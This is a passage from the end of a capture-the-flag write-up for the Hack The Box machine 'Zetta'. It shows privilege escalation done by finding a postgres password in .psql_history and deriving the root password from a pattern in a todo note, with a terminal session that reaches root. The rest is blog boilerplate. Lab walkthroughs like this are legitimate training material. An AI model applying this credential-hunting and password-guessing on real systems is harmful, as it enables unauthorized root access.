+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgres@zetta:~$ cat .psql_history 
+CREATE DATABASE syslog;
+\c syslog
+CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
+\d syslog_lines
+ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+</code></pre></div></div>
+<p>and I have todo list from shell of roy .tudu.xml and got this.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nt">&lt;todo</span> <span class="na">done=</span><span class="s">"no"</span> <span class="na">collapse=</span><span class="s">"no"</span><span class="nt">&gt;</span>
+      <span class="nt">&lt;title&gt;</span>Change shared password scheme from <span class="ni">&amp;lt;</span>secret<span class="ni">&amp;gt;</span>@userid to something more secure.<span class="nt">&lt;/title&gt;</span>
+                                <span class="nt">&lt;text&gt;</span>
+<span class="nt">&lt;/text&gt;</span>
+</code></pre></div></div>
+
+<p>From above two notes: format of password of user posgres and todo list I made conclusion as password root should be <code class="highlighter-rouge">sup3rs3cur3p4ass@root</code>.
+Finally that worked and got the root shell and root.txt.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>postgres@zetta:~$ su root
+Password: 
+root@zetta:/var/lib/postgresql# cd
+root@zetta:~# whoami
+root
+root@zetta:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@zetta:~# cat root.txt
+b9407e837fb****************
+</code></pre></div></div>
+
+<p>This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box jkr for such an awesome box.</p>
+
+<p>I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.<br />
+Feedback are really appreciated !!<br />
+Tweet about this writeup if you like.</p>
+
+<p>You can see more blog at my medium here: <a href="https://medium.com/@gr4n173">gr4n173</a>.</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2020/02/22/htb-zetta.html';
+     this.page.identifier = '/2020/02/22/htb-zetta';
+     this.page.title = 'Hack The Box: Zetta';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//gr4n173-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2019/04/16/welcome-to-jekyll2.html">
+            Welcome to Jekyll!
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/ftp/" class="set-5">ftp</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/introduction/" class="set-5">introduction</a> <a href="/tag/ipv6/" class="set-5">ipv6</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/postgres/" class="set-5">postgres</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/rsync/" class="set-5">rsync</a> <a href="/tag/sqli/" class="set-5">sqli</a> <a href="/tag/welcome/" class="set-5">welcome</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
